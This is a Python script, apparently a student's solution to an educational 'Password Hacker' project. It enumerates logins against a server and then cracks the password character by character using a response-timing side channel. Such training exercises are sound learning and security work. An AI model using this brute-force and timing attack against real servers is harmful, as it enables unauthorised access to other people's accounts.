"""

PASSWORD HACKER

About
All sorts of creatures lurk around the Internet, including trolls, pirates, miners – and hackers. 
In this project you’ll wear the hat of a real hacker. You must connect to a secret server without knowing the password. 
Your task is to write a Python program that can hack this password, and do so in the quickest way possible.

Learning outcomes
You will learn how hacking works. 
You will work with iterators and generators, and you’ll learn a little something about the itertools module – one of the most powerful features of Python. 
You will practice developing a client app and connecting to a server using the socket module. 
The project will also get you acquainted with JSON and the time module.

Stage 1
For starters, let’s pretend the admin's website isn't protected at all. 
Learn how to connect to the server and receive data from it to access private information. 

Stage 2
OK, the admin has pumped up the server and it is now password-protected. 
But the password is probably short. 
Let's hack it by applying brute force (and no, that does not mean taking a jackhammer to the physical server!). 

Stage 3
The admin has picked up on our attempts to access the server, so now it is protected with a more complex password. 
Maybe the password is long but not unique? Let's hack it using a dictionary of the most common passwords! 

Stage 4
The admin is really taking the case seriously. 
Now it is necessary to specify a valid login and password, and the password cannot be cracked by brute force. 
And yet, there is a vulnerability in the system that you can exploit to identify the admin's login and password. 

Stage 5
The admin has reacted quickly and made a patch that removes the vulnerability. 
It's time to look for another one. Poor admin… 

"""

import socket
import argparse
import json
from itertools import product
from datetime import datetime
from string import ascii_lowercase as lower
from string import digits


def server(hostname, port):
    with socket.socket() as my_socket:
        address = (hostname, port)
        my_socket.connect(address)

        try:
            user = user_gen()
            login_condition = {'result': 'Wrong password!'}
            login_success = {'result': 'Connection success!'}
            while True:
                log_pass["login"] = next(user)
                mssg = json.dumps(log_pass)
                mssg = mssg.encode()
                my_socket.send(mssg)
                mssg_rcv = my_socket.recv(1024)
                mssg_rcv = mssg_rcv.decode()
                mssg_rcv = json.loads(mssg_rcv)
                if login_condition == mssg_rcv:
                    raise Exception
                else:
                    pass
        except Exception:
            nw_password = ""
            old_password = ""
            while True:
                password = password_gen()
                while True:
                    try:
                        nw_password = nw_password + str(next(password))
                        log_pass["password"] = nw_password
                        mssg = json.dumps(log_pass)
                        mssg = mssg.encode()
                        my_socket.send(mssg)
                        send_time = datetime.now()
                        mssg_rcv = my_socket.recv(1024)
                        rcv_time = datetime.now()
                        delta_time = (rcv_time - send_time).microseconds
                        mssg_rcv = mssg_rcv.decode()
                        mssg_rcv = json.loads(mssg_rcv)
                        if delta_time >= 1000:
                            old_password = nw_password
                            raise Exception
                        elif mssg_rcv == login_success:
                            return json.dumps(log_pass)
                        else:
                            if len(nw_password) > 1:
                                nw_password = old_password
                            else:
                                nw_password = ""
                    except Exception:
                        break


def user_gen():
    with open(path_users, "r", encoding='UTF-8') as logins:
        for user in logins:
            user = user.strip("\n")
            yield user


def password_gen():
    for i in range(1, 6):
        for x in product(alphabet, repeat=i):
            x = "".join(x)
            password_lst = map(''.join, product(*zip(x.upper(), x.lower())))
            for password in password_lst:
                yield str(password)


parser = argparse.ArgumentParser()
parser.add_argument("host", type=str)
parser.add_argument("port", type=int)
args = parser.parse_args()

path_passwords = "/Users/dsalzedo/PycharmProjects/Password Hacker/Password Hacker/task/passwords.txt"
path_users = "/Users/dsalzedo/PycharmProjects/Password Hacker/Password Hacker/task/logins.txt"

log_pass = {"login": "", "password": ""}
alphabet = lower + digits
print(server(args.host, args.port))
